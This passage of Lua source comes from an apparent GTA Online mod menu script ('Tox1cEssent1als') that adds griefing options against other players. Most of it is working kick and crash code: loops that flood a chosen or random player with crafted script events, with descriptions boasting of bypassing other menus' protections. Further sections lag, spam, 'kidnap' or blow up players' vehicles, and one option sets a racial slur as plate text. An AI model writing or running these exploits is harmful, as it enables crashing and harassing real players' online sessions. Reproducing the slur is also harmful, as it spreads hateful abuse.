            util.yield()
        end
        playerped3 = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        table_ladder[attach] = OBJECT.CREATE_OBJECT(hash, 1.55, 3.35, 0, true, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(
            table_ladder[attach],
            playerped3,
            0,
            aY,
            aZ,
            a_,
            b0,
            b2,
            b1,
            false,
            true,
            true,
            false,
            0,
            false
        )
        ENTITY.SET_ENTITY_VISIBLE(table_ladder[attach], b3)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
        attach = attach + 1
    end
    dvdr = menu.divider(menu.player_root(pid), "Tox1cEssent1als")
    main =
        menu.list(
        menu.player_root(pid),
        "Tox1cEssent1als",
        {},
        "",
        function()
        end
    )
    selcplyr =
        menu.list(
        main,
        tostring(PLAYER.GET_PLAYER_NAME(pid)),
        {},
        "",
        function()
        end
    )
    randplyr =
        menu.list(
        main,
        "Random Player",
        {},
        "",
        function()
        end
    )
    allplyrs =
        menu.list(
        main,
        "All Players",
        {},
        "",
        function()
        end
    )
    menu.divider(randplyr, "Random Player")
    menu.action(
        randplyr,
        "Kick",
        {"kickrandom"},
        "",
        function()
            pids = math.random(0, 32)
            while pids == players.user() or not players.exists(pids) do
                pids = math.random(0, 32)
            end
            if pids ~= players.user() then
                if players.user() == players.get_host() then
                    notification("Host Kick has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), true, false)
                    menu.trigger_commands("hostkick " .. PLAYER.GET_PLAYER_NAME(pids))
                else
                    KickV1(pids, 2)
                    KickV2(pids, 2)
                    notification("Kick V1 & V2 has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), true, false)
                end
            end
        end
    )
    menu.action(
        randplyr,
        "collapse",
        {"crashrandom"},
        "",
        function()
            pids = math.random(0, 32)
            while pids == players.user() or not players.exists(pids) do
                pids = math.random(0, 32)
            end
            if pids ~= players.user() then
                Crash(pids)
                notification("Event Crash has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), true, false)
            end
        end
    )
    menu.divider(allplyrs, "All Players")
    kickevents =
        menu.list(
        selcplyr,
        "Kick Events",
        {},
        "",
        function()
        end
    )
    kickver =
        menu.list(
        kickevents,
        "踢",
        {},
        "",
        function()
        end
    )
    menu.action(
        kickver,
        "踢V1",
        {},
        "Completely bypasses Cherax protections, they will not have a single notification",
        function()
            if pid ~= players.user() and players.exists(pid) then
                KickV1(pid, 2)
                notification("Kick V1 has been sent to " .. PLAYER.GET_PLAYER_NAME(pid), true, true)
            end
        end
    )
    menu.action(
        kickver,
        "Kick V2",
        {},
        "Works on Cherax and PhantomX and Midnight",
        function()
            if pid ~= players.user() and players.exists(pid) then
                KickV2(pid, 2)
                notification("Kick V2 has been sent to " .. PLAYER.GET_PLAYER_NAME(pid), true, true)
            end
        end
    )
    menu.action(
        kickver,
        "Kick V3",
        {},
        "Works on Cherax",
        function()
            if pid ~= players.user() and players.exists(pid) then
                KickV3(pid, 2)
                notification("Kick V3 has been sent to " .. PLAYER.GET_PLAYER_NAME(pid), true, true)
            end
        end
    )
    menu.action(
        kickver,
        "Kick V4",
        {},
        "",
        function()
            if pid ~= players.user() and players.exists(pid) then
                KickV4(pid, 2)
                notification("Kick V4 has been sent to " .. PLAYER.GET_PLAYER_NAME(pid), true, true)
            end
        end
    )
    menu.action(
        kickver,
        "Kick V5",
        {},
        "",
        function()
            if pid ~= players.user() and players.exists(pid) then
                Kick1Type1(pid)
                NetKick3(pid, 1)
                NetKick4(pid, 1)
                notification("Kick V5 has been sent to " .. PLAYER.GET_PLAYER_NAME(pid), true, true)
            end
        end
    )
    menu.action(
        kickver,
        "Kick V6",
        {},
        "Works on Cherax",
        function()
            if pid ~= players.user() and players.exists(pid) then
                KickV6(pid, 2)
                notification("Kick V6 has been sent to " .. PLAYER.GET_PLAYER_NAME(pid), true, true)
            end
        end
    )
    menu.action(
        kickver,
        "Kick V7",
        {},
        "",
        function()
            if pid ~= players.user() and players.exists(pid) then
                LastWayCrash(pid, 2)
                notification("Kick V7 has been sent to " .. PLAYER.GET_PLAYER_NAME(pid), true, true)
            end
        end
    )
    menu.action(
        kickver,
        "Kick V8",
        {},
        "Works on Cherax",
        function()
            if pid ~= players.user() and players.exists(pid) then
                for U = 1, 60 do
                    hash = math.random(1, #a6)
                    modhash = a6[hash]
                    send_script_event(
                        modhash,
                        pid,
                        {-17645264, -26800537, -66094971, -45281983, -24450684, -13000488, 59643555, 91870118, -3283691}
                    )
                    send_script_event(
                        modhash,
                        pid,
                        {-17645264, -26800537, -66094971, -45281983, -24450684, -13000488, 59643555, 91870118, -3283691}
                    )
                    send_script_event(
                        modhash,
                        pid,
                        {-17645264, -26800537, -66094971, -45281983, -24450684, -13000488, 59643555, 91870118, -3283691}
                    )
                    send_script_event(
                        modhash,
                        pid,
                        {-17645264, -26800537, -66094971, -45281983, -24450684, -13000488, 59643555, 91870118, -3283691}
                    )
                    send_script_event(
                        modhash,
                        pid,
                        {-17645264, -26800537, -66094971, -45281983, -24450684, -13000488, 59643555, 91870118, -3283691}
                    )
                    send_script_event(
                        modhash,
                        pid,
                        {-17645264, -26800537, -66094971, -45281983, -24450684, -13000488, 59643555, 91870118, -3283691}
                    )
                    send_script_event(modhash, pid, H(pid))
                    send_script_event(modhash, pid, H(pid))
                    send_script_event(modhash, pid, H(pid))
                    send_script_event(modhash, pid, H(pid))
                    send_script_event(modhash, pid, H(pid))
                    send_script_event(modhash, pid, H(pid))
                    util.yield()
                end
                notification("Kick V8 has been sent to " .. PLAYER.GET_PLAYER_NAME(pid), true, true)
            end
        end
    )
    menu.action(
        kickver,
        "Kick V9",
        {},
        "Legacy version of Kick V1",
        function()
            if pid ~= players.user() and players.exists(pid) then
                KickV9(pid, 2)
                notification("Kick V9 has been sent to " .. PLAYER.GET_PLAYER_NAME(pid), true, true)
            end
        end
    )
    menu.action(
        kickver,
        "Kick V10",
        {},
        "Works on X-Force",
        function()
            if pid ~= players.user() and players.exists(pid) then
                KickV10(pid, 2)
                notification("Kick V10 has been sent to " .. PLAYER.GET_PLAYER_NAME(pid), true, true)
            end
        end
    )
    kickv11 =
        menu.list(
        kickver,
        "Kick V11",
        {},
        "",
        function()
        end
    )
    menu.action(
        kickv11,
        "Kick V11 Type 1",
        {},
        "",
        function()
            if pid ~= players.user() and players.exists(pid) then
                for U = 1, 60 do
                    local b4 = a5[math.random(1, #a5)]
                    send_script_event(
                        b4,
                        pid,
                        {pid, -26800537, -66094971, -21482748, -13000488, 59643555, b4, 91870118, -3283691}
                    )
                end
                notification("Kick V11 Type 1 has been sent to " .. PLAYER.GET_PLAYER_NAME(pid), true, true)
            end
        end
    )
    menu.action(
        kickv11,
        "Kick V11 Type 2",
        {},
        "",
        function()
            if pid ~= players.user() and players.exists(pid) then
                local b5 = {
                    -1559754940,
                    -2033338628,
                    -1243454584,
                    -442306200,
                    1352706024,
                    -1252906024,
                    1317868303,
                    -1990292823,
                    -1890951223,
                    1428412924,
                    -1246838892,
                    -1212832151,
                    830707189,
                    1119498954,
                    -1729804184,
                    -891346918,
                    -920663435,
                    -1924332863,
                    -1549630786,
                    1998625272,
                    1977655521,
                    -1054826273,
                    620255745,
                    2017765964,
                    1974064500,
                    -966559987,
                    1070934291,
                    -345371965,
                    -2042143896,
                    1922258436,
                    495824472,
                    1159655011,
                    -2017629233,
                    -435067392,
                    1347850743,
                    -1648921703,
                    -1333236192
                }
                for U = 1, 60 do
                    local b6 = b5[math.random(1, #b5)]
                    send_script_event(
                        b6,
                        pid,
                        {
                            pid,
                            -26800537,
                            math.random(-147264233, 194938483),
                            -13000488,
                            59643555,
                            b6,
                            91870118,
                            -3283691
                        }
                    )
                end
                notification("Kick V11 Type 2 has been sent to " .. PLAYER.GET_PLAYER_NAME(pid), true, true)
            end
        end
    )
    menu.action(
        kickv11,
        "Kick V11 Type 3",
        {},
        "",
        function()
            if pid ~= players.user() and players.exists(pid) then
                local b7 = {-1329008922, 1841943281, -435067392, -1252906024, -442306200, -1559754940}
                for U = 1, 15 do
                    local b8 = b7[math.random(1, #b7)]
                    send_script_event(
                        b8,
                        pid,
                        {pid, -26800537, math.random(-147264233, 194938483), 59643555, b8, 91870118, -3283691}
                    )
                    local b4 = a5[math.random(1, #a5)]
                    send_script_event(
                        b4,
                        pid,
                        {pid, -26800537, -66094971, -21482748, -24450684, -13000488, 59643555, b4, 91870118, -3283691}
                    )
                end
                notification("Kick V11 Type 3 has been sent to " .. PLAYER.GET_PLAYER_NAME(pid), true, true)
            end
        end
    )
    menu.action(
        kickv11,
        "Kick V11 Type 4",
        {},
        "",
        function()
            if pid ~= players.user() and players.exists(pid) then
                local b9 = {
                    699592812,
                    1922258436,
                    1881968783,
                    -1252906024,
                    -1559754940,
                    -966559987,
                    -442306200,
                    1352706024,
                    -435067392,
                    733106126,
                    -1890951223,
                    1317868303,
                    -1329008922,
                    1841943281
                }
                for U = 1, 30 do
                    local ba = b9[math.random(1, #b9)]
                    send_script_event(
                        ba,
                        pid,
                        {
                            pid,
                            -26800537,
                            math.random(-147264233, 194938483),
                            -13000488,
                            59643555,
                            ba,
                            91870118,
                            -3283691
                        }
                    )
                end
                notification("Kick V11 Type 4 has been sent to " .. PLAYER.GET_PLAYER_NAME(pid), true, true)
            end
        end
    )
    menu.action(
        kickv11,
        "Kick V11 Type 5",
        {},
        "",
        function()
            if pid ~= players.user() and players.exists(pid) then
                local bb = {
                    -1890951223,
                    699592812,
                    1922258436,
                    -1252906024,
                    1101235920,
                    121406262,
                    -1256990787,
                    -1054826273,
                    1620254541,
                    1317868303,
                    1401831542,
                    2099816323,
                    -1491386500,
                    -435067392,
                    1428412924,
                    -1212832151,
                    1347850743,
                    -1729804184,
                    1881968783,
                    -1559754940,
                    -442306200,
                    733106126,
                    -966559987
                }
                for U = 1, 50 do
                    local bc = bb[math.random(1, #bb)]
                    send_script_event(
                        bc,
                        pid,
                        {
                            pid,
                            -26800537,
                            math.random(-147264233, 194938483),
                            -21482748,
                            59643555,
                            bc,
                            91870118,
                            -3283691
                        }
                    )
                end
                notification("Kick V11 Type 5 has been sent to " .. PLAYER.GET_PLAYER_NAME(pid), true, true)
            end
        end
    )
    menu.action(
        kickv11,
        "Kick V11 Type 6",
        {},
        "Works on X-Force",
        function()
            if pid ~= players.user() and players.exists(pid) then
                KickV10(pid, 2)
                notification("Kick V11 Type 6 has been sent to " .. PLAYER.GET_PLAYER_NAME(pid), true, true)
            end
        end
    )
    menu.action(
        kickv11,
        "Kick V11 Type 7",
        {},
        "",
        function()
            if pid ~= players.user() and players.exists(pid) then
                local bd = {
                    -1252906024,
                    -442306200,
                    -1559754940,
                    -1212832151,
                    -966559987,
                    1977655521,
                    -1054826273,
                    620255745,
                    2017765964,
                    1974064500,
                    1428412924,
                    1119498954,
                    -87967637,
                    -891346918,
                    266760875,
                    -920663435,
                    -1990292823,
                    -1549630786,
                    1998625272,
                    1070934291,
                    813647057,
                    -606720730,
                    -1890951223,
                    -158670784,
                    -531496987,
                    -1264063129,
                    1317868303,
                    -510378036,
                    -815817885
                }
                for U = 1, 50 do
                    local be = bd[math.random(1, #bd)]
                    send_script_event(
                        be,
                        pid,
                        {
                            pid,
                            -26800537,
                            math.random(-147264233, 194938483),
                            -24450684,
                            -13000488,
                            be,
                            91870118,
                            -3283691
                        }
                    )
                end
                notification("Kick V11 Type 7 has been sent to " .. PLAYER.GET_PLAYER_NAME(pid), true, true)
            end
        end
    )
    menu.action(
        kickver,
        "Kick V12",
        {},
        "Represents Kick 6",
        function()
            if pid ~= players.user() and players.exists(pid) then
                for U = 1, #e do
                    EventArray(pid, 1, e[U])
                    EventArray(pid, 1, e[math.random(1, #e)])
                    EventArray(pid, 1, e[math.random(U, #e)])
                    util.yield()
                end
                notification("Kick V12 has been sent to " .. PLAYER.GET_PLAYER_NAME(pid), true, true)
            end
        end
    )
    menu.action(
        kickver,
        "Kick V13",
        {},
        "Represents Kick 5 Type 3",
        function()
            if pid ~= players.user() and players.exists(pid) then
                NetKick3(pid, 2)
                NetKick4(pid)
                notification("Kick V13 has been sent to " .. PLAYER.GET_PLAYER_NAME(pid), true, true)
            end
        end
    )
    menu.action(
        kickver,
        "Kick V14",
        {},
        "Represents Kick 5 Type 4",
        function()
            if pid ~= players.user() and players.exists(pid) then
                NetKick4(pid)
                notification("Kick V14 has been sent to " .. PLAYER.GET_PLAYER_NAME(pid), true, true)
            end
        end
    )
    eventarrays =
        menu.list(
        selcplyr,
        "Event Arrays",
        {},
        "",
        function()
        end
    )
    vehopts =
        menu.list(
        selcplyr,
        "Vehicle Events",
        {},
        "Works only if you are standing near to selected player",
        function()
        end
    )
    lock_sub_vehicle_tab =
        menu.list(
        vehopts,
        "Lock Options",
        {},
        "",
        function()
        end
    )
    mov_sub_vehicle_tab =
        menu.list(
        vehopts,
        "Movement Options",
        {},
        "",
        function()
        end
    )
    troll_sub_vehicle_tab =
        menu.list(
        vehopts,
        "Trolling Options",
        {},
        "",
        function()
        end
    )
    health_sub_vehicle_tab =
        menu.list(
        vehopts,
        "Health and Appereance Options",
        {},
        "",
        function()
        end
    )
    detach_sub_vehicle_tab =
        menu.list(
        vehopts,
        "Detach Options",
        {},
        "",
        function()
        end
    )
    plane_sub_vehicle_tab =
        menu.list(
        vehopts,
        "Plane and Helicopter Options",
        {},
        "",
        function()
        end
    )
    menu.action(
        health_sub_vehicle_tab,
        "Repair Vehicle",
        {"fixveh"},
        "Repairs player's vehicle",
        function()
            local R = get_player_veh(pid, true)
            if R then
                VEHICLE.SET_VEHICLE_FIXED(R)
            end
        end
    )
    menu.action(
        troll_sub_vehicle_tab,
        "NIGGER Plate Text",
        {"niggerplate"},
        "Sets player's vehicle plate text to NIGGER",
        function()
            local R = get_player_veh(pid, true)
            if R then
                VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(R, "NIGGER")
            end
        end
    )
    menu.action(
        troll_sub_vehicle_tab,
        "COCK Plate Text",
        {"cockplate"},
        "Sets player's vehicle plate text to COCK",
        function()
            local R = get_player_veh(pid, true)
            if R then
                VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(R, "COCK")
            end
        end
    )
    menu.action(
        troll_sub_vehicle_tab,
        "TRASH Plate Text",
        {"trashplate"},
        "Sets player's vehicle plate text to TRASH",
        function()
            local R = get_player_veh(pid, true)
            if R then
                VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(R, "TRASH")
            end
        end
    )
    menu.action(
        health_sub_vehicle_tab,
        "Repair Vehicle Shell",
        {"fixvehshl"},
        "Repairs player's vehicle but don't repair it's engine",
        function()
            local R = get_player_veh(pid, true)
            if R then
                VEHICLE.SET_VEHICLE_DEFORMATION_FIXED(R)
            end
        end
    )
    menu.action(
        health_sub_vehicle_tab,
        "Quick Upgrade Vehicle",
        {"ugveh"},
        "Upgrades player's vehicle",
        function()
            upgrade_vehicle(pid)
        end
    )
    menu.action(
        health_sub_vehicle_tab,
        "Disable Invincibility",
        {"removeinv"},
        "Removes invincibility from player's vehicle",
        function()
            local R = get_player_veh(pid, true)
            if R then
                ENTITY.SET_ENTITY_INVINCIBLE(R, false)
            end
        end
    )
    menu.action(
        health_sub_vehicle_tab,
        "启用无敌",
        {"giveinv"},
        "Gives invincibility to player's vehicle",
        function()
            local R = get_player_veh(pid, true)
            if R then
                ENTITY.SET_ENTITY_INVINCIBLE(R, true)
            end
        end
    )
    menu.action(
        health_sub_vehicle_tab,
        "Destroy Engine",
        {"killveh"},
        "Destroys vehicle engine",
        function()
            local R = get_player_veh(pid, true)
            if R then
                VEHICLE.SET_VEHICLE_ENGINE_HEALTH(R, -4000)
                VEHICLE.SET_VEHICLE_BODY_HEALTH(R, -4000)
                VEHICLE.SET_VEHICLE_PETROL_TANK_HEALTH(R, -4000)
            end
        end
    )
    menu.action(
        health_sub_vehicle_tab,
        "Revive Engine",
        {"reviveh"},
        "Revives vehicle engine",
        function()
            local R = get_player_veh(pid, true)
            if R then
                VEHICLE.SET_VEHICLE_ENGINE_HEALTH(R, 1000)
                VEHICLE.SET_VEHICLE_BODY_HEALTH(R, 1000)
                VEHICLE.SET_VEHICLE_PETROL_TANK_HEALTH(R, 1000)
            end
        end
    )
    menu.action(
        health_sub_vehicle_tab,
        "Explode Vehicle",
        {"explodeveh"},
        "Explodes vehicle",
        function()
            local R = get_player_veh(pid, false)
            if R then
                VEHICLE.ADD_VEHICLE_PHONE_EXPLOSIVE_DEVICE(R)
                VEHICLE.DETONATE_VEHICLE_PHONE_EXPLOSIVE_DEVICE()
            end
        end
    )
    menu.action(
        mov_sub_vehicle_tab,
        "Reset Acceleration",
        {"reacc"},
        "Resets max speed of vehicle",
        function()
            local R = get_player_veh(pid, true)
            if R then
                VEHICLE.MODIFY_VEHICLE_TOP_SPEED(R, 1)
            end
        end
    )
    menu.action(
        mov_sub_vehicle_tab,
        "Boost Acceleration",
        {"boostacc"},
        "Sets max speed of vehicle to 9999999",
        function()
            local R = get_player_veh(pid, true)
            if R then
                VEHICLE.MODIFY_VEHICLE_TOP_SPEED(R, 9999999)
            end
        end
    )
    menu.action(
        mov_sub_vehicle_tab,
        "Trash Acceleration",
        {"tacc"},
        "Sets max speed of vehicle to INT_MIN",
        function()
            local R = get_player_veh(pid, true)
            if R then
                VEHICLE.MODIFY_VEHICLE_TOP_SPEED(R, -2147483647)
            end
        end
    )
    menu.action(
        mov_sub_vehicle_tab,
        "East",
        {"eastveh"},
        "Boosts player's vehicle in the East direction",
        function()
            local R = get_player_veh(pid, true)
            if R then
                ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(R, 1, 10000, 0, 0, true, false, true)
            end
        end
    )
    menu.action(
        mov_sub_vehicle_tab,
        "West",
        {"westveh"},
        "Boosts player's vehicle in the West direction",
        function()
            local R = get_player_veh(pid, true)
            if R then
                ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(R, 1, -10000, 0, 0, true, false, true)
            end
        end
    )
    menu.action(
        mov_sub_vehicle_tab,
        "South",
        {"southveh"},
        "Boosts player's vehicle in the South direction",
        function()
            local R = get_player_veh(pid, true)
            if R then
                ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(R, 1, 0, -10000, 0, true, false, true)
            end
        end
    )
    menu.action(
        mov_sub_vehicle_tab,
        "North",
        {"northveh"},
        "Boosts player's vehicle in the North direction",
        function()
            northp_vehicle(pid)
        end
    )
    menu.action(
        mov_sub_vehicle_tab,
        "Launch Up",
        {"launchup"},
        "Shoots player up",
        function()
            launch_vehicle(pid)
        end
    )
    menu.action(
        mov_sub_vehicle_tab,
        "Launch Down",
        {"launchdown"},
        "Shoots player down",
        function()
            local R = get_player_veh(pid, true)
            if R then
                ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(R, 1, 0, 0, -10000, true, false, true)
            end
        end
    )
    menu.action(
        detach_sub_vehicle_tab,
        "Detach Trailer",
        {"detachtrailer"},
        "Detaches attached trailer",
        function()
            local R = get_player_veh(pid, true)
            if R then
                VEHICLE.DETACH_VEHICLE_FROM_TRAILER(R)
            end
        end
    )
    menu.action(
        detach_sub_vehicle_tab,
        "Detach from Cargobob",
        {"detachcbob"},
        "Detaches from Cargobob",
        function()
            local R = get_player_veh(pid, true)
            if R then
                VEHICLE.DETACH_VEHICLE_FROM_ANY_CARGOBOB(R)
            end
        end
    )
    menu.action(
        lock_sub_vehicle_tab,
        "Lock Doors",
        {"lockveh"},
        "Locks the doors",
        function()
            local R = get_player_veh(pid, true)
            if R then
                VEHICLE.SET_VEHICLE_DOORS_LOCKED(R, 4)
            end
        end
    )
    menu.action(
        lock_sub_vehicle_tab,
        "Unlock Doors",
        {"unlockveh"},
        "Unlocks the doors",
        function()
            local R = get_player_veh(pid, true)
            if R then
                VEHICLE.SET_VEHICLE_DOORS_LOCKED(R, 1)
            end
        end
    )
    menu.action(
        lock_sub_vehicle_tab,
        "Make Vehicle Drivable",
        {"engineon"},
        "Makes player's vehicle drivable again",
        function()
            local R = get_player_veh(pid, true)
            if R then
                VEHICLE.SET_VEHICLE_UNDRIVEABLE(R, false)
            end
        end
    )
    menu.action(
        lock_sub_vehicle_tab,
        "Make Vehicle Undrivable",
        {"engineoff"},
        "Makes player's vehicle undrivable",
        function()
            local R = get_player_veh(pid, true)
            if R then
                VEHICLE.SET_VEHICLE_UNDRIVEABLE(R, true)
            end
        end
    )
    menu.action(
        plane_sub_vehicle_tab,
        "Deploy Landing Gear",
        {"landing1"},
        "",
        function()
            local R = get_player_veh(pid, true)
            if R then
                VEHICLE.CONTROL_LANDING_GEAR(R, 0)
            end
        end
    )
    menu.action(
        plane_sub_vehicle_tab,
        "Retract Landing Gear",
        {"landing0"},
        "",
        function()
            local R = get_player_veh(pid, true)
            if R then
                VEHICLE.CONTROL_LANDING_GEAR(R, 3)
            end
        end
    )
    menu.action(
        plane_sub_vehicle_tab,
        "Disable Cargobob's Hook",
        {"nohook"},
        "Disables cargobob's hook. when used, that cargobob's hook will no longer work",
        function()
            local R = get_player_veh(pid, true)
            if R then
                VEHICLE.REMOVE_PICK_UP_ROPE_FOR_CARGOBOB(R)
            end
        end
    )
    menu.action(
        plane_sub_vehicle_tab,
        "Strong Turbulence",
        {"turb1"},
        "Makes turbulence stronger",
        function()
            local R = get_player_veh(pid, true)
            if R then
                VEHICLE.SET_PLANE_TURBULENCE_MULTIPLIER(R, 1.0)
            end
        end
    )
    menu.action(
        plane_sub_vehicle_tab,
        "No Turbulence",
        {"turb0"},
        "Makes turbulence weaker",
        function()
            local R = get_player_veh(pid, true)
            if R then
                VEHICLE.SET_PLANE_TURBULENCE_MULTIPLIER(R, 0.0)
            end
        end
    )
    menu.action(
        plane_sub_vehicle_tab,
        "Set Propeller Speed at 100%",
        {"propel100"},
        "",
        function()
            local R = get_player_veh(pid, true)
            if R then
                VEHICLE.SET_HELI_BLADES_SPEED(R, 1.0)
            end
        end
    )
    menu.action(
        plane_sub_vehicle_tab,
        "Set Propeller Speed at 0%",
        {"propel0"},
        "",
        function()
            local R = get_player_veh(pid, true)
            if R then
                VEHICLE.SET_HELI_BLADES_SPEED(R, 0.0)
            end
        end
    )
    menu.action(
        lock_sub_vehicle_tab,
        "Lock that bich in",
        {"blockcar"},
        "Locks the doors, paints the car Hot Pink, changes plate text to 'LOCKED'",
        function()
            local R = get_player_veh(pid, true)
            if R then
                VEHICLE.SET_VEHICLE_DOORS_LOCKED(R, 4)
                VEHICLE.SET_VEHICLE_COLOURS(R, 135, 135)
                VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(R, "LOCKED")
            end
        end
    )
    menu.action(
        lock_sub_vehicle_tab,
        "Release that bich out",
        {"bunlockcar"},
        "Unlocks the doors, paints the vehicle Green, changes plate text to 'URFREE'",
        function()
            local R = get_player_veh(pid, true)
            if R then
                VEHICLE.SET_VEHICLE_DOORS_LOCKED(R, 1)
                VEHICLE.SET_VEHICLE_COLOURS(R, 92, 92)
                VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(R, "URFREE")
            end
        end
    )
    menu.action(
        mov_sub_vehicle_tab,
        "Teleport to me",
        {"tp2me"},
        "Tries to teleport player's vehicle to you",
        function()
            local bf = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), true)
            tp_veh_to(pid, bf.x, bf.y, bf.z)
        end
    )
    menu.action(
        mov_sub_vehicle_tab,
        "Teleport to ocean",
        {"tp2sea"},
        "Tries to teleport player's vehicle to the ocean",
        function()
            tp_veh_to(pid, 15000, 15000, 0)
        end
    )
    objevents =
        menu.list(
        selcplyr,
        "Entity Events",
        {},
        "",
        function()
        end
    )
    menu.action(
        objevents,
        "Attachment Array",
        {},
        "May lead to a self crash",
        function(ac)
            notification("Started attaching vehicles", true, true)
            for U = 1, 5 do
                for bg = 1, #ay do
                    attach_vehicle(ay[bg], pid)
                end
            end
            notification("Done", true, true)
        end
    )
    menu.action(
        objevents,
        "Lag Player",
        {},
        "",
        function(ac)
            notification("Started", true, true)
            for U = 1, 5 do
                if players.exists(pid) then
                    attach_vehicle_to_ped(ay, "MP_M_Cocaine_01", pid, 10)
                    attach_vehicle_to_ped(aA, "MP_M_Cocaine_01", pid, 60)
                    attach_vehicle_to_ped(aB, "MP_M_Cocaine_01", pid, 60)
                    attach_vehicle_to_ped(aC, "MP_M_Cocaine_01", pid, 60)
                    attach_vehicle_to_ped(aD, "MP_M_Cocaine_01", pid, 60)
                    attach_vehicle_to_ped(aE, "MP_M_Cocaine_01", pid, 60)
                    attach_vehicle_to_ped(aF, "MP_M_Cocaine_01", pid, 20)
                    attach_vehicle_to_ped(az, "MP_M_Cocaine_01", pid, 30)
                end
            end
            notification("Done", true, true)
        end
    )
    menu.action(
        objevents,
        "Spam Player",
        {},
        "",
        function(ac)
            while not STREAMING.HAS_MODEL_LOADED(447548909) and not STREAMING.HAS_MODEL_LOADED(util.joaat("cargoplane")) do
                STREAMING.REQUEST_MODEL(447548909)
                STREAMING.REQUEST_MODEL(util.joaat("cargoplane"))
                util.yield(10)
            end
            notification("Started", true, true)
            local bh = PLAYER.GET_PLAYER_PED(pid)
            local bi = ENTITY.GET_ENTITY_COORDS(bh, true)
            spam_amount = 500
            while spam_amount >= 1 do
                util.create_vehicle(447548909, bi, 0)
                util.yield(10)
                util.create_vehicle(util.joaat("cargoplane"), bi, 0)
                spam_amount = spam_amount - 1
                util.yield(10)
            end
            notification("Done", true, true)
        end
    )
    menu.action(
        objevents,
        "Attach Ladder",
        {},
        "",
        function(ac)
            attach_ladder(ladder, 0.8, 3.55, 0, 1.55, 1.55, 3.35, false, pid)
            attach_ladder(ladder, -0.8, -3.55, 0, 1.55, 181.55, 3.35, false, pid)
            attach_ladder(ladder, -3.55, 1, 0, 1.55, 91.55, 3.35, false, pid)
            attach_ladder(ladder, -3.55, 0.9, 0, 1.55, 91.55, 3.35, false, pid)
            attach_ladder(ground, 0, 0, -2, 0, 0, -2, false, pid)
        end
    )
    menu.action(
        objevents,
        "Spawn Attacker Tank",
        {},
        "",
        function(ac)
            V3 = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            hash = util.joaat("rhino")
            ped_hash = util.joaat("MP_M_Cocaine_01")
            if STREAMING.IS_MODEL_A_VEHICLE(hash) then
                STREAMING.REQUEST_MODEL(hash)
                while not STREAMING.HAS_MODEL_LOADED(hash) do
                    util.yield()
                end
                aab = v3()
                aab = player.get_player_coords(pid)
                aab.x = -5784.258301
                aab.y = -8289.385742
                aab.z = -136.411270
                ENTITY.SET_ENTITY_VISIBLE(ped_to_kidnap, false)
                ENTITY.FREEZE_ENTITY_POSITION(ped_to_kidnap, false)
                table_kidnap[veh_to_attach] =
                    util.create_vehicle(hash, ENTITY.GET_ENTITY_COORDS(V3, true), CAM.GET_FINAL_RENDERED_CAM_ROT(0).z)
                while not STREAMING.HAS_MODEL_LOADED(ped_hash) do
                    STREAMING.REQUEST_MODEL(ped_hash)
                    util.yield()
                end
                ped_to_kidnap = util.create_ped(28, ped_hash, aab, CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)
                ped_to_drive = util.create_ped(28, ped_hash, aab, CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)
                ENTITY.SET_ENTITY_INVINCIBLE(table_kidnap[veh_to_attach], true)
                ENTITY.ATTACH_ENTITY_TO_ENTITY(
                    table_kidnap[veh_to_attach],
                    ped_to_kidnap,
                    0,
                    0,
                    1,
                    -1,
                    0,
                    0,
                    0,
                    false,
                    true,
                    true,
                    false,
                    0,
                    false
                )
                coords_ped = v3()
                coords_ped = ENTITY.GET_ENTITY_COORDS(V3, true)
                coords_ped.x = coords_ped.x + math.random(-20, 20)
                coords_ped.y = coords_ped.y + math.random(-20, 20)
                coords_ped.z = coords_ped.z
                ENTITY.SET_ENTITY_COORDS(
                    ped_to_kidnap,
                    coords_ped.x,
                    coords_ped.y,
                    coords_ped.z,
                    false,
                    false,
                    false,
                    false
                )
                PED.SET_PED_INTO_VEHICLE(ped_to_drive, table_kidnap[veh_to_attach], -1)
                VEHICLE.SET_VEHICLE_ENGINE_ON(table_kidnap[veh_to_attach], true, true, false)
                TASK.TASK_VEHICLE_SHOOT_AT_PED(ped_to_drive, V3, 1)
                TASK.TASK_VEHICLE_CHASE(ped_to_drive, V3)
                util.yield(1)
                delet_entity(ped_to_kidnap)
                veh_to_attach = veh_to_attach + 1
                STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
                STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(ped_hash)
            end
        end
    )
    menu.action(
        objevents,
        "Kidnap Player",
        {},
        "",
        function(ac)
            V3 = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            hash = util.joaat("stockade")
            ped_hash = util.joaat("MP_M_Cocaine_01")
            if STREAMING.IS_MODEL_A_VEHICLE(hash) then
                STREAMING.REQUEST_MODEL(hash)
                while not STREAMING.HAS_MODEL_LOADED(hash) do
                    util.yield()
                end
                coords_ped = ENTITY.GET_ENTITY_COORDS(V3, true)
                aab = v3()
                aab = player.get_player_coords(pid)
                aab.x = -5784.258301
                aab.y = -8289.385742
                aab.z = -136.411270
                ENTITY.SET_ENTITY_VISIBLE(ped_to_kidnap, false)
                ENTITY.FREEZE_ENTITY_POSITION(ped_to_kidnap, true)
                table_kidnap[veh_to_attach] =
                    util.create_vehicle(hash, ENTITY.GET_ENTITY_COORDS(V3, true), CAM.GET_FINAL_RENDERED_CAM_ROT(0).z)
                while not STREAMING.HAS_MODEL_LOADED(ped_hash) do
                    STREAMING.REQUEST_MODEL(ped_hash)
                    util.yield()
                end
